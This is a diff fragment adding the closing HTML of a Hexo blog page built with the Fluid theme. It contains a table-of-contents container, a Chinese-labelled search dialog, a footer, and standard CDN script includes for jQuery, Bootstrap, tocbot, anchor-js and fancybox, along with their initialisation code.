+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
